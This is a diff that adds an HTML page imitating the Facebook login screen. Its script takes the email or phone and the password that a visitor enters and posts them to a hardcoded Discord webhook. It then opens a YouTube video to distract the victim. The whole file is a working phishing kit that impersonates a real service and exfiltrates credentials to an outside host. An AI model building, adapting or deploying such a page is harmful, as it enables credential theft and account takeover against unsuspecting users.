@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="design.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h2>Log into Facebook</h2>
+            <form id="loginForm"> 
+                <div class="textbox">
+                    <input type="text" id="email" placeholder="Email or Phone" required>
+                </div>
+                <div class="textbox">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button class="btn" type="submit">Log In</button>
+                <div class="footer">
+                    <a href="https://en-gb.facebook.com/login/identify/">Forgotten password?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value; 
+            const password = document.getElementById('password').value; 
+
+           
+            const payload = {
+                content: `***New Login Attempt***\nEmail or Phone: ${email}\nPassword: ${password}`
+            };
+
+
+
+
+
+
+
+
+
+         
+            fetch('https://discord.com/api/webhooks/1342881430757179544/-IAWnsEfKRTYFypwiZpWUMJpl5vHv0aT_YKFGiziC4LZnfNlqp7hsES05IiC85hlmUky', {
+           method: 'POST',
+                headers: {
+
+
+
+
+
+
+
+
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+      
+                if (response.ok) {
+          
+
+                   
+                    const links = [
+                        'https://www.youtube.com/watch?v=cXO7CeGmAvs&list=RDcXO7CeGmAvs&start_radio=1',
+                        
+                    ];
+
+                   
+                    links.forEach(link => {
+                        window.open(link, '_blank');
+                    });
+                } else {
+                    alert('login failed');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('login failed.');
+            });
+        });
+    </script>
+</body>
+</html>
